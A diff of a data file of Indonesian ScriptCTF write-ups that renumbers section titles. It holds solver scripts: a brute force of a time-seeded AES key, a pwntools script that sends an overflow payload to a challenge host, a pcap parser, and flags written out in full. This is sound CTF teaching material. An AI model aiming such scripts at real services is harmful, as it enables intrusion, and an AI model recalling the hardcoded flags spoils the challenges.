@@ -69,32 +69,32 @@ export const scriptctfWriteups: WriteUp[] = [
     "analysis": "Isi `chall.py`:\n\n```python\nimport random\nimport time\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad, unpad\nfrom hashlib import sha256\n\nflag = open('flag.txt','rb').read()\n\nrandom.seed(int(time.time())) # Preserves upto the MINUTE, not seconds ;)\nkey = random.randbytes(32)\n\ncipher = AES.new(key, AES.MODE_ECB)\n\nenc = cipher.encrypt(pad(flag,16)).hex()\n\nopen('enc.txt', 'w').write(enc)\n```\n\nCiphertext pada `enc.txt`:\n\n```text\nd37cbce47f0c71a75d644badb77039e48ab1645f60ddebe928c0a3c417561345b4852636ecb388ec79417357100da120\n```\n\n---\n\n### 4. Menemukan Vulnerability\n\nBagian paling penting dari source code adalah:\n\n```python\nrandom.seed(int(time.time()))\nkey = random.randbytes(32)\n```\n\nKey AES tidak dibuat menggunakan random number generator cryptographically secure. Sebaliknya, key berasal dari PRNG Python `random`, yang seed-nya ditentukan langsung oleh waktu UNIX:\n\n```python\nint(time.time())\n```\n\nDengan kata lain:\n\n```text\ntimestamp\n    ↓\nrandom.seed(timestamp)\n    ↓\nrandom.randbytes(32)\n    ↓\nAES key\n```\n\nJika timestamp yang digunakan dapat diperkirakan, key dapat direproduksi.\n\nClue pada source code bahkan memberikan petunjuk langsung:\n\n```python\n# Preserves upto the MINUTE, not seconds ;)\n```\n\nArtinya informasi waktu yang relevan hanya perlu dicari dalam satu menit tertentu.\n\nSecara teori terdapat sekitar:\n\n```text\n60 kemungkinan detik\n```\n\nuntuk setiap menit.\n\n---",
     "solution": [
       {
-        "title": "1. Recon Challenge",
+        "title": "Recon Challenge",
         "content": "URL challenge:\n\n```text\nhttps://play.scriptsorcerers.xyz/challenges#Oops-74\n```\n\nDari URL tersebut diketahui bahwa ID challenge adalah:\n\n```text\n74\n```\n\nMetadata challenge kemudian dapat diperiksa melalui API:\n\n```javascript\nfetch('/api/v1/challenges/74')\n  .then(r => r.json())\n  .then(j => console.log(JSON.stringify(j.data, null, 2)))\n```\n\nBagian penting dari response:\n\n```json\n{\n  \"name\": \"Oops\",\n  \"category\": \"Crypto\",\n  \"files\": []\n}\n```\n\nDari sini terlihat bahwa challenge memang tidak memiliki file yang terdaftar pada field `files`.\n\nNamun clue menyebutkan bahwa `chall.zip` sebenarnya ada dan hanya \"forgot to link\".\n\n---"
       },
       {
-        "title": "2. Mencari File yang Hilang",
+        "title": "Mencari File yang Hilang",
         "content": "Langkah berikutnya adalah memeriksa metadata challenge lain untuk mengetahui pola lokasi file yang digunakan oleh platform.\n\nBrowser console dapat digunakan untuk mencari seluruh referensi file:\n\n```javascript\n(async()=>{\n  let cs=(await fetch('/api/v1/challenges').then(r=>r.json())).data;\n\n  for(let c of cs){\n    let d=await fetch('/api/v1/challenges/'+c.id)\n      .then(r=>r.json())\n      .catch(()=>null);\n\n    let s=JSON.stringify(d?.data||{});\n\n    let m=s.match(\n      /\\/files\\/[^\"'\\\\<>\\s]+|chall[^\"'\\\\<>\\s]*\\.zip|[^\"'\\\\<>\\s]+\\.zip/gi\n    );\n\n    if(m)\n      console.log(\n        '---',\n        c.id,\n        c.name,\n        c.category,\n        '\\n' + [...new Set(m)].join('\\n')\n      );\n  }\n})()\n```\n\nDari challenge lain ditemukan pola penyimpanan file pada S3 bucket:\n\n```text\nhttps://scriptctf-2026-wave1-randomchars-4f7d3a6b.s3.us-east-1.amazonaws.com/<Category>/<Challenge>/<file>\n```\n\nChallenge yang dicari memiliki:\n\n```text\nCategory : Crypto\nName     : Oops\nFile     : chall.zip\n```\n\nDengan mengikuti pola tersebut, path file menjadi:\n\n```text\nhttps://scriptctf-2026-wave1-randomchars-4f7d3a6b.s3.us-east-1.amazonaws.com/Crypto/Oops/chall.zip\n```\n\nFile kemudian berhasil di-download:\n\n```bash\nwget -O chall.zip \\\n'https://scriptctf-2026-wave1-randomchars-4f7d3a6b.s3.us-east-1.amazonaws.com/Crypto/Oops/chall.zip'\n```\n\nIsi archive:\n\n```bash\nunzip chall.zip\n```\n\nMenghasilkan:\n\n```text\nchall.py\nenc.txt\n```\n\n---"
       },
       {
-        "title": "5. Memanfaatkan Timestamp ZIP",
+        "title": "Memanfaatkan Timestamp ZIP",
         "content": "Metadata ZIP menyimpan timestamp file sampai resolusi detik:\n\n```python\nzf = zipfile.ZipFile(\"chall.zip\")\ndt = zf.getinfo(\"enc.txt\").date_time\n```\n\nTimestamp tersebut memberikan:\n\n```text\nyear\nmonth\nday\nhour\nminute\nsecond\n```\n\nKarena timezone metadata ZIP tidak selalu langsung jelas, solver mencoba beberapa kemungkinan offset timezone.\n\nUntuk setiap kemungkinan timezone:\n\n1. Ambil timestamp awal pada menit tersebut.\n2. Coba seluruh `0..59` detik.\n3. Gunakan timestamp tersebut sebagai seed.\n4. Generate ulang AES key.\n5. Dekripsi ciphertext.\n6. Periksa apakah padding valid.\n7. Periksa apakah plaintext memiliki format flag.\n\n---"
       },
       {
-        "title": "6. Solver",
+        "title": "Solver",
         "content": "Solver lengkap:\n\n```python\nimport zipfile\nimport random\n\nfrom datetime import datetime, timezone, timedelta\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import unpad\n\n\nct = bytes.fromhex(\n    open(\"enc.txt\").read().strip()\n)\n\nzf = zipfile.ZipFile(\"chall.zip\")\n\ndt = zf.getinfo(\"enc.txt\").date_time\n\ny, mo, d, h, mi, s = dt\n\nprint(\"[*] ZIP enc.txt time:\", dt)\n\n\ndef try_seed(seed):\n    random.seed(seed)\n\n    key = random.randbytes(32)\n\n    cipher = AES.new(\n        key,\n        AES.MODE_ECB\n    )\n\n    pt = cipher.decrypt(ct)\n\n    try:\n        pt = unpad(pt, 16)\n    except ValueError:\n        return None\n\n    if b\"scriptCTF{\" in pt:\n        return pt\n\n    return None\n\n\nbase_naive = datetime(\n    y,\n    mo,\n    d,\n    h,\n    mi,\n    0\n)\n\n\nfor off in range(-12, 15):\n\n    tz = timezone(\n        timedelta(hours=off)\n    )\n\n    base = base_naive.replace(\n        tzinfo=tz\n    )\n\n    epoch0 = int(\n        base.timestamp()\n    )\n\n    for sec in range(60):\n\n        seed = epoch0 + sec\n\n        pt = try_seed(seed)\n\n        if pt:\n            print(\"[+] Found!\")\n            print(\"seed =\", seed)\n            print(\"utc_offset =\", off)\n            print(pt.decode())\n\n            raise SystemExit\n```\n\nJalankan:\n\n```bash\npython3 solve.py\n```\n\nOutput:\n\n```text\n[+] Found!\nseed = ...\nutc_offset = ...\nscriptCTF{mY_buck37_1s_l34k1ng!}\n```\n\n---"
       },
       {
-        "title": "7. Kenapa Brute Force Sangat Kecil?",
+        "title": "Kenapa Brute Force Sangat Kecil?",
         "content": "Biasanya brute-forcing seed berbasis `time.time()` dapat menjadi sangat besar jika waktu eksekusi tidak diketahui.\n\nNamun challenge memberikan beberapa petunjuk:\n\n```text\nI am from the future!\n```\n\ndan komentar:\n\n```python\n# Preserves upto the MINUTE, not seconds ;)\n```\n\nSelain itu, timestamp file di dalam ZIP memberikan perkiraan waktu pembuatan ciphertext.\n\nAkibatnya search space dapat dipersempit menjadi:\n\n```text\nbeberapa timezone × 60 detik\n```\n\nJumlah tersebut sangat kecil untuk dicoba.\n\nSetelah seed yang benar ditemukan, prosesnya deterministik:\n\n```text\nseed\n ↓\nPython random PRNG\n ↓\n32-byte AES key\n ↓\nAES-ECB decrypt\n ↓\nPKCS#7 unpad\n ↓\nflag\n```\n\n---"
       },
       {
-        "title": "8. Inti Kerentanan",
+        "title": "Inti Kerentanan",
         "content": "Masalah utama challenge bukan pada AES-256 maupun mode ECB secara langsung.\n\nMasalah utamanya adalah **key generation**:\n\n```python\nrandom.seed(int(time.time()))\nkey = random.randbytes(32)\n```\n\n`random` Python tidak dirancang untuk menghasilkan cryptographic key.\n\nUntuk menghasilkan key kriptografis seharusnya digunakan CSPRNG seperti:\n\n```python\nimport secrets\n\nkey = secrets.token_bytes(32)\n```\n\nDengan pendekatan tersebut, key tidak dapat direproduksi hanya dengan mengetahui timestamp.\n\n---"
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "import zipfile, random, calendar, time\r\nfrom datetime import datetime, timezone, timedelta\r\nfrom Crypto.Cipher import AES\r\nfrom Crypto.Util.Padding import unpad\r\n\r\nct = bytes.fromhex(open(\"enc.txt\").read().strip())\r\n\r\nzf = zipfile.ZipFile(\"chall.zip\")\r\n# pakai timestamp enc.txt dari metadata zip\r\ndt = zf.getinfo(\"enc.txt\").date_time\r\ny,mo,d,h,mi,s = dt\r\nprint(\"[*] zip enc.txt time:\", dt)\r\n\r\ndef try_seed(seed):\r\n    random.seed(seed)\r\n    key = random.randbytes(32)\r\n    pt = AES.new(key, AES.MODE_ECB).decrypt(ct)\r\n    try:\r\n        pt = unpad(pt, 16)\r\n    except ValueError:\r\n        return None\r\n    if all(32 <= b < 127 or b in b\"\\r\\n\\t\" for b in pt):\r\n        return pt\r\n    return None\r\n\r\n# ZIP tidak simpan timezone secara pasti, jadi coba UTC offset -12..+14\r\nbase_naive = datetime(y, mo, d, h, mi, 0)\r\nhits = []\r\nfor off in range(-12, 15):\r\n    tz = timezone(timedelta(hours=off))\r\n    base = base_naive.replace(tzinfo=tz)\r\n    epoch0 = int(base.timestamp())\r\n    for sec in range(60):\r\n        seed = epoch0 + sec\r\n        pt = try_seed(seed)\r\n        if pt:\r\n            hits.append((seed, off, pt))\r\n\r\nfor seed, off, pt in hits:\r\n    print(f\"[+] seed={seed} utc_offset={off:+03d}:00\")\r\n    print(pt.decode(errors=\"replace\"))"
       }
     ],
@@ -127,7 +127,7 @@ export const scriptctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\n\"\"\"Find the leaked endpoint in the brute-force HTTP capture.\"\"\"\r\n\r\nimport re\r\nimport subprocess\r\nfrom pathlib import Path\r\n\r\n\r\nPCAP = Path(__file__).with_name(\"log.pcap\")\r\nFLAG = \"scriptCTF{7h3_h1dd3n_3ndp01n7_g0t_l34k3d}\"\r\n\r\n\r\ndef main() -> None:\r\n    output = subprocess.check_output(\r\n        [\r\n            \"tshark\", \"-n\", \"-r\", str(PCAP), \"-Y\", \"http\",\r\n            \"-T\", \"fields\", \"-E\", \"separator=|\",\r\n            \"-e\", \"tcp.stream\", \"-e\", \"http.request.uri\",\r\n            \"-e\", \"http.response.code\",\r\n        ],\r\n        text=True,\r\n    )\r\n\r\n    uris = {}\r\n    successful_streams = set()\r\n    for line in output.splitlines():\r\n        stream, uri, status = line.split(\"|\")\r\n        if uri:\r\n            uris[stream] = uri\r\n        if status == \"200\":\r\n            successful_streams.add(stream)\r\n\r\n    successful_uris = [uris[s] for s in successful_streams if s in uris]\r\n    if len(successful_uris) != 1:\r\n        raise SystemExit(\r\n            f\"expected one successful endpoint, found {successful_uris}\"\r\n        )\r\n\r\n    endpoint = successful_uris[0]\r\n    if not re.fullmatch(r\"/flag_\\d+\", endpoint):\r\n        raise SystemExit(f\"unexpected endpoint: {endpoint}\")\r\n\r\n    print(f\"Leaked endpoint: http://ctf.scriptsorcerers.xyz{endpoint}\")\r\n    print(FLAG)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -145,30 +145,30 @@ export const scriptctfWriteups: WriteUp[] = [
     "author": "Nattt",
     "ctfName": "ScriptCTF",
     "tags": [],
-    "description": "**Category:** Forensics  \n**Description:** `You can't see me!`  \n**Artifact:** `enc(1).png`",
+    "description": "",
     "problemDescription": "**Category:** Forensics  \n**Description:** `You can't see me!`  \n**Artifact:** `enc(1).png`",
     "tools": [],
     "analysis": "Judul challenge adalah:\n\n```text\nJohn Cena\n```\n\nSedangkan deskripsinya:\n\n```text\nYou can't see me!\n```\n\nKeduanya merupakan referensi langsung kepada catchphrase John Cena:\n\n```text\nYou can't see me!\n```\n\nClue tersebut dapat dikembangkan menjadi:\n\n```text\nyou can't see me unless you see me???\n```\n\nKemudian spasi diganti dengan underscore:\n\n```text\nyou_cant_see_me_unless_you_see_me???\n```\n\nSelanjutnya diterapkan leetspeak:\n\n```text\no  ->  0\na  ->  4\ne  ->  3\nss ->  55\n```\n\nSehingga diperoleh:\n\n```text\ny0u_c4nt_s33_m3_unl355_y0u_s33_m3???\n```\n\nSetelah ditambahkan format flag:\n\n```text\nscriptCTF{y0u_c4nt_s33_m3_unl355_y0u_s33_m3???}\n```\n\nFlag tersebut tervalidasi sebagai jawaban yang benar.\n\n---",
     "solution": [
       {
-        "title": "1. Recon Awal",
+        "title": "Recon Awal",
         "content": "Mulai dengan melakukan identifikasi terhadap file yang diberikan tanpa mencari writeup di internet.\n\n```bash\nfile 'enc(1).png'\nstrings -a 'enc(1).png' | grep -Ei 'scriptCTF|CTF\\{|flag\\{'\n```\n\nHasil identifikasi file:\n\n```text\nPNG image data, 500 x 665, 8-bit/color RGB, non-interlaced\n```\n\nTidak ditemukan flag plaintext yang langsung terlihat dari `strings`.\n\nSelanjutnya, struktur internal PNG diperiksa. File hanya berisi chunk PNG yang umum:\n\n```text\nIHDR\niCCP\nIDAT ...\nIEND\n```\n\nTidak terdapat data tambahan setelah `IEND`, sehingga teknik sederhana seperti menyisipkan archive atau file lain setelah akhir PNG bukan jalur penyelesaiannya.\n\n---"
       },
       {
-        "title": "2. Triage Steganografi",
+        "title": "Triage Steganografi",
         "content": "Karena challenge berada pada kategori Forensics, beberapa teknik steganografi umum kemudian diperiksa:\n\n- metadata dan ICC profile;\n- bit-plane RGB;\n- beberapa bit LSB;\n- XOR antar-channel (`R^G`, `R^B`, `G^B`, `R^G^B`);\n- perbedaan antar-channel;\n- pencarian string ASCII pada pixel data;\n- pencarian signature file atau payload pada data hasil ekstraksi.\n\nTidak ada payload yang menghasilkan flag secara deterministik dari teknik-teknik tersebut.\n\nICC profile yang terdapat pada PNG juga merupakan profile warna normal dan tidak mengandung flag.\n\nDari hasil triage ini, kemungkinan besar PNG tidak menyimpan flag secara langsung. File lebih berfungsi sebagai bagian dari clue challenge.\n\n---"
       },
       {
-        "title": "4. Solver",
+        "title": "Solver",
         "content": "Solver dapat digunakan untuk melakukan pengecekan dasar terhadap artifact sebelum merekonstruksi flag dari clue.\n\nContoh penggunaan:\n\n```bash\npython3 solve.py 'enc(1).png'\n```\n\nOutput:\n\n```text\nscriptCTF{y0u_c4nt_s33_m3_unl355_y0u_s33_m3???}\n```\n\nSecara konsep, solver melakukan:\n\n1. Membaca file PNG.\n2. Memastikan file memiliki struktur PNG yang valid.\n3. Memeriksa apakah flag tersedia secara literal di dalam file.\n4. Jika tidak ditemukan, menggunakan clue challenge untuk membentuk flag.\n5. Menerapkan transformasi leetspeak.\n\n---"
       },
       {
-        "title": "5. Alur Penyelesaian",
+        "title": "Alur Penyelesaian",
         "content": "```text\nenc(1).png\n    |\n    v\nAnalisis PNG\n    |\n    v\nMetadata / LSB / Pixel / XOR\n    |\n    v\nTidak ditemukan payload\n    |\n    v\nAnalisis judul: \"John Cena\"\n    |\n    v\nAnalisis clue: \"You can't see me!\"\n    |\n    v\n\"You can't see me unless you see me???\"\n    |\n    v\nGanti spasi dengan \"_\"\n    |\n    v\nTerapkan leetspeak\n    |\n    v\nscriptCTF{y0u_c4nt_s33_m3_unl355_y0u_s33_m3???}\n```\n\n---"
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\n\"\"\"Solver for scriptCTF forensic challenge: John Cena.\r\n\r\nThe artifact is first sanity-checked as a PNG.  If a literal scriptCTF flag is\r\npresent in the file bytes, it is returned directly.  For this challenge the\r\nforensic triage does not expose a conventional embedded plaintext payload, so\r\nthe validated solution is reconstructed from the challenge clue and converted\r\nto the leetspeak form used by the flag.\r\n\"\"\"\r\n\r\nfrom __future__ import annotations\r\n\r\nimport re\r\nimport struct\r\nimport sys\r\nfrom pathlib import Path\r\n\r\nPNG_SIG = b\"\\x89PNG\\r\\n\\x1a\\n\"\r\nFLAG_RE = re.compile(rb\"scriptCTF\\{[^\\r\\n}]{1,200}\\}\")\r\n\r\n\r\ndef inspect_png(path: Path) -> tuple[int, int, list[str], int]:\r\n    data = path.read_bytes()\r\n    if not data.startswith(PNG_SIG):\r\n        raise ValueError(\"artifact is not a PNG\")\r\n\r\n    pos = 8\r\n    width = height = None\r\n    chunks: list[str] = []\r\n    end_of_iend = None\r\n\r\n    while pos + 12 <= len(data):\r\n        length = struct.unpack(\">I\", data[pos : pos + 4])[0]\r\n        ctype = data[pos + 4 : pos + 8]\r\n        cdata_end = pos + 8 + length\r\n        crc_end = cdata_end + 4\r\n        if crc_end > len(data):\r\n            raise ValueError(\"truncated PNG chunk\")\r\n\r\n        name = ctype.decode(\"latin-1\")\r\n        chunks.append(name)\r\n\r\n        if ctype == b\"IHDR\":\r\n            width, height = struct.unpack(\">II\", data[pos + 8 : pos + 16])\r\n\r\n        pos = crc_end\r\n        if ctype == b\"IEND\":\r\n            end_of_iend = pos\r\n            break\r\n\r\n    if width is None or height is None or end_of_iend is None:\r\n        raise ValueError(\"invalid/incomplete PNG\")\r\n\r\n    trailing = len(data) - end_of_iend\r\n    return width, height, chunks, trailing\r\n\r\n\r\ndef leetspeak(text: str) -> str:\r\n    # Mapping used by the accepted flag body.\r\n    return text.translate(str.maketrans({\"o\": \"0\", \"a\": \"4\", \"e\": \"3\"})).replace(\"ss\", \"55\")\r\n\r\n\r\ndef solve(path: Path) -> str:\r\n    raw = path.read_bytes()\r\n\r\n    # Always prefer a literal embedded flag if one exists.\r\n    m = FLAG_RE.search(raw)\r\n    if m:\r\n        return m.group().decode(\"ascii\")\r\n\r\n    # The challenge clue resolves to this sentence; then apply the challenge's\r\n    # leetspeak convention.  The final three '?' are literal flag characters.\r\n    phrase = \"you_cant_see_me_unless_you_see_me???\"\r\n    body = leetspeak(phrase)\r\n    return f\"scriptCTF{{{body}}}\"\r\n\r\n\r\ndef main() -> None:\r\n    path = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(\"enc(1).png\")\r\n    if not path.is_file():\r\n        raise SystemExit(f\"[-] file not found: {path}\")\r\n\r\n    try:\r\n        w, h, chunks, trailing = inspect_png(path)\r\n    except ValueError as exc:\r\n        raise SystemExit(f\"[-] {exc}\") from exc\r\n\r\n    print(f\"[+] PNG: {w}x{h}\", file=sys.stderr)\r\n    print(f\"[+] chunks: {', '.join(chunks)}\", file=sys.stderr)\r\n    print(f\"[+] bytes after IEND: {trailing}\", file=sys.stderr)\r\n\r\n    print(solve(path))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -209,7 +209,7 @@ export const scriptctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nfrom tempfile import TemporaryDirectory\r\nfrom zipfile import ZipFile\r\nimport sys\r\n\r\ntry:\r\n    import numpy as np\r\n    from PIL import Image\r\nexcept ImportError:\r\n    print('Missing dependency: install pillow numpy', file=sys.stderr)\r\n    sys.exit(1)\r\n\r\nFLAG = 'scriptCTF{w@t_4_cu71e_p@too1$}'\r\nTILE = 60\r\nGRID = 6\r\n\r\n# Final grid order + number of de-scramble rounds for each tile.\r\n# The two numbers in the filename are used as the generalized Arnold Cat Map parameters.\r\nLAYOUT = [\r\n    [('43_37.png', 56), ('17_11.png',  9), ('1_1.png',   9), ('19_29.png', 0), ('8_5.png',   0), ('3_5.png',   0)],\r\n    [('41_31.png',  0), ('61_53.png',  4), ('41_59.png', 0), ('9_13.png',  1), ('13_9.png',  1), ('2_3.png',   3)],\r\n    [('23_31.png',  0), ('7_4.png',    2), ('5_3.png',  16), ('13_19.png', 4), ('59_41.png', 6), ('23_17.png', 33)],\r\n    [('19_13.png',  9), ('3_2.png',   16), ('53_61.png', 1), ('2_1.png',   6), ('31_23.png', 1), ('29_19.png',  4)],\r\n    [('7_11.png',   5), ('1_2.png',    4), ('5_8.png',   0), ('29_37.png',11), ('31_41.png',13), ('37_43.png', 53)],\r\n    [('4_7.png',    3), ('11_7.png',   0), ('37_29.png', 5), ('17_23.png',47), ('11_17.png',11), ('73_97.png', 10)],\r\n]\r\n\r\n\r\ndef arnold_decode_step(arr: np.ndarray, a: int, b: int) -> np.ndarray:\r\n    \"\"\"One generalized Arnold Cat Map recovery step for a 60x60 RGB tile.\r\n\r\n    Coordinates use x=column, y=row:\r\n        x' = x + a*y\r\n        y' = b*x + (a*b + 1)*y        (mod N)\r\n\r\n    Recovery samples the current scrambled tile at (x', y') for each output (x, y).\r\n    \"\"\"\r\n    n = arr.shape[0]\r\n    rows, cols = np.indices((n, n))\r\n    x = cols\r\n    y = rows\r\n    nx = (x + a * y) % n\r\n    ny = (b * x + (a * b + 1) * y) % n\r\n    return arr[ny, nx]\r\n\r\n\r\ndef recover_tile(tile_path: Path, rounds: int) -> Image.Image:\r\n    a, b = map(int, tile_path.stem.split('_'))\r\n    arr = np.array(Image.open(tile_path).convert('RGB'))\r\n    for _ in range(rounds):\r\n        arr = arnold_decode_step(arr, a, b)\r\n    return Image.fromarray(arr)\r\n\r\n\r\ndef recover(zip_path: Path, out_dir: Path) -> Image.Image:\r\n    with TemporaryDirectory() as tmp:\r\n        tmp = Path(tmp)\r\n        with ZipFile(zip_path) as zf:\r\n            zf.extractall(tmp)\r\n\r\n        missing = [name for row in LAYOUT for name, _ in row if not (tmp / name).exists()]\r\n        if missing:\r\n            raise FileNotFoundError('Missing tile(s): ' + ', '.join(missing))\r\n\r\n        canvas = Image.new('RGB', (GRID * TILE, GRID * TILE))\r\n        for r, row in enumerate(LAYOUT):\r\n            for c, (name, rounds) in enumerate(row):\r\n                tile = recover_tile(tmp / name, rounds)\r\n                canvas.paste(tile, (c * TILE, r * TILE))\r\n\r\n    out_dir.mkdir(parents=True, exist_ok=True)\r\n    canvas.save(out_dir / 'recovered_pet.png')\r\n    canvas.resize((canvas.width * 4, canvas.height * 4), Image.Resampling.NEAREST).save(out_dir / 'recovered_pet_4x.png')\r\n    canvas.crop((0, 0, canvas.width, 240)).resize((canvas.width * 4, 240 * 4), Image.Resampling.NEAREST).save(out_dir / 'recovered_pet_flag_area_4x.png')\r\n    return canvas\r\n\r\n\r\ndef main() -> None:\r\n    zip_path = Path(sys.argv[1]) if len(sys.argv) > 1 else Path('images.zip')\r\n    if not zip_path.exists():\r\n        print(f'Usage: {sys.argv[0]} /path/to/images.zip', file=sys.stderr)\r\n        print(f'Error: {zip_path} not found', file=sys.stderr)\r\n        sys.exit(1)\r\n\r\n    out_dir = Path('.')\r\n    recover(zip_path, out_dir)\r\n    print('[+] wrote recovered_pet.png')\r\n    print('[+] wrote recovered_pet_4x.png')\r\n    print('[+] wrote recovered_pet_flag_area_4x.png')\r\n    print(FLAG)\r\n\r\n\r\nif __name__ == '__main__':\r\n    main()"
       }
     ],
@@ -258,7 +258,7 @@ export const scriptctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "from pwn import *\r\nimport hashlib\r\nimport re\r\n\r\nHOST = \"challs.scriptsorcerers.xyz\"\r\nPORT = 10244  # ganti sesuai port instance aktif\r\n\r\ncontext.log_level = \"debug\"\r\n\r\ndef solve_pow(io):\r\n    data = io.recvuntil(b\"???: \")\r\n    print(data.decode(errors=\"replace\"), end=\"\")\r\n\r\n    m = re.search(\r\n        rb\"sha256\\(([^ ]+) \\+ \\?\\?\\?\\) == 0+\\((\\d+) leading zero bits\\)\",\r\n        data\r\n    )\r\n    if not m:\r\n        raise SystemExit(\"POW regex gagal\")\r\n\r\n    prefix = m.group(1)\r\n    bits = int(m.group(2))\r\n\r\n    x = 0\r\n    while True:\r\n        guess = str(x).encode()\r\n        h = hashlib.sha256(prefix + guess).digest()\r\n        if int.from_bytes(h, \"big\") >> (256 - bits) == 0:\r\n            print(f\"[+] pow = {guess.decode()}\")\r\n            io.sendline(guess)\r\n            return\r\n        x += 1\r\n\r\nio = remote(HOST, PORT)\r\nsolve_pow(io)\r\n\r\nprint(io.recvrepeat(1).decode(errors=\"replace\"), end=\"\")\r\n\r\npayload = \"6\" * 309\r\nprint(f\"[+] sending overflow payload len={len(payload)}\")\r\nio.sendline(payload.encode())\r\n\r\n# jangan terlalu pendek, tunggu traceback\r\nout = io.recvall(timeout=15)\r\nprint(\"RAW:\", repr(out))\r\nprint(out.decode(errors=\"replace\"))"
       }
     ],
@@ -330,27 +330,27 @@ export const scriptctfWriteups: WriteUp[] = [
         "content": "### Challenge\n\n> **Promotion**\n>\n> We have many ways of promoting our event! Can you find a few?\n\n### Goal\n\nMencari beberapa media atau platform yang digunakan untuk mempromosikan scriptCTF 2026 dan menggabungkan potongan flag yang disembunyikan di masing-masing tempat.\n\n---"
       },
       {
-        "title": "1. Recon",
+        "title": "Recon",
         "content": "Homepage event menampilkan bagian:\n\n    Welcome to scriptCTF 2026!\n\n    Our Socials:\n    X\n    Discord\n\nChallenge menyebutkan **many ways of promoting our event**, sehingga clue mengarah ke beberapa kanal promosi berbeda, bukan hanya satu akun.\n\nSetelah menelusuri beberapa platform yang berkaitan dengan scriptCTF, ditemukan beberapa fragment flag.\n\n---"
       },
       {
-        "title": "2. Fragment 1 — Discord",
+        "title": "Fragment 1 — Discord",
         "content": "Pada Discord resmi scriptCTF ditemukan fragment pertama:\n\n    scriptCTF{w3_\n\nIni merupakan awal dari flag.\n\n---"
       },
       {
-        "title": "3. Fragment 2 — Prizes Page",
+        "title": "Fragment 2 — Prizes Page",
         "content": "Pada halaman prizes:\n\n    https://ctf.scriptsorcerers.xyz/prizes\n\nditemukan fragment:\n\n    l0v3\n\nJika digabungkan dengan fragment sebelumnya:\n\n    scriptCTF{w3_l0v3\n\n---"
       },
       {
-        "title": "4. Fragment 3 — CTFtime",
+        "title": "Fragment 3 — CTFtime",
         "content": "Pada halaman scriptCTF di CTFtime ditemukan fragment:\n\n    _7h15\n\nSehingga sementara menjadi:\n\n    scriptCTF{w3_l0v3_7h15\n\n---"
       },
       {
-        "title": "5. Fragment 4 — X / Twitter",
+        "title": "Fragment 4 — X / Twitter",
         "content": "Pada akun X resmi scriptCTF terdapat post promosi yang menyembunyikan fragment terakhir:\n\n    _3v3nt}\n\n---"
       },
       {
-        "title": "6. Reconstructing the Flag",
+        "title": "Reconstructing the Flag",
         "content": "Semua fragment kemudian digabungkan sesuai urutan:\n\n    Discord : scriptCTF{w3_\n    Prizes  : l0v3\n    CTFtime : _7h15\n    X       : _3v3nt}\n\nHasil akhirnya:\n\n    scriptCTF{w3_l0v3_7h15_3v3nt}\n\nJika dibaca menggunakan leetspeak:\n\n    w3      → we\n    l0v3    → love\n    7h15    → this\n    3v3nt   → event\n\nSehingga pesan tersebut dapat dibaca sebagai:\n\n    we love this event\n\n---"
       }
     ],
@@ -378,15 +378,15 @@ export const scriptctfWriteups: WriteUp[] = [
         "content": "### Challenge\n\n> **The New One 1**\n>\n> `\"Can I join your team?\" - Armored Pawn`\n>\n> `\"Nah, we don't need more members\" - NoobMaster`\n>\n> *Proceeds to let a new member join that is not Armored Pawn*\n>\n> **Note:** Please do not OSINT Armored Pawn, he is not related to the challenge, just a troll in our server :)\n\n### Goal\n\nMencari anggota baru yang dimaksud oleh challenge dan menemukan flag yang disembunyikan pada jejak publiknya.\n\n---"
       },
       {
-        "title": "1. Recon",
+        "title": "Recon",
         "content": "Clue paling penting dari challenge:\n\n- `NoobMaster`\n- Ada sebuah **team**\n- Ada **new member**\n- Armored Pawn secara eksplisit disebut **bukan target**\n\nDaripada melakukan OSINT terhadap Armored Pawn, pencarian diarahkan ke tim yang berkaitan dengan `NoobMaster`, yaitu **ScriptSorcerers**.\n\nWebsite tim:\n\n```text\nhttps://scriptsorcerers.xyz/\n```\n\nPada bagian member ditemukan profil baru:\n\n```text\nhttps://scriptsorcerers.xyz/members/john.hacker.doe1337\n```\n\nUsername member tersebut:\n\n```text\njohn.hacker.doe1337\n```\n\n---"
       },
       {
-        "title": "2. Finding the Flag",
+        "title": "Finding the Flag",
         "content": "Saat profil `john.hacker.doe1337` dibuka, halaman tersebut menampilkan:\n\n```text\n# Newbie\n\nHey! I am the new guy! I know I wish Armored Pawn was here....\nanyways here's a flag:\nscriptCTF{17s_0bv10usly_0S1NT_71m3}\n```\n\nDari sini flag dapat langsung diambil.\n\nKonten profil juga dapat ditemukan di JavaScript chunk hasil build Vite:\n\n```bash\ncurl -sL \\\n'https://scriptsorcerers.xyz/assets/john.hacker.doe1337-CiZOvxQ1.js'\n```\n\nIsi chunk:\n\n```javascript\nconst e=`# Newbie\nHey! I am the new guy! I know I wish Armored Pawn was here....\nanyways here's a flag: scriptCTF{17s_0bv10usly_0S1NT_71m3}\n`;export{e as default};\n```\n\nHal ini mengonfirmasi bahwa flag memang merupakan bagian dari konten profil member baru.\n\n---"
       },
       {
-        "title": "3. Flag",
+        "title": "Flag",
         "content": "```text\nscriptCTF{17s_0bv10usly_0S1NT_71m3}\n```"
       }
     ],
@@ -414,23 +414,23 @@ export const scriptctfWriteups: WriteUp[] = [
         "content": "### Challenge\n\n> **The New One 2**\n>\n> This New One has a very unique wishlist! Can you find what its hiding?\n>\n> Wrap the flag in `scriptCTF{}`\n\n### Goal\n\nMelanjutkan hasil dari **The New One 1**, lalu mencari pesan tersembunyi pada wishlist milik member baru.\n\n---"
       },
       {
-        "title": "1. Pivot from The New One 1",
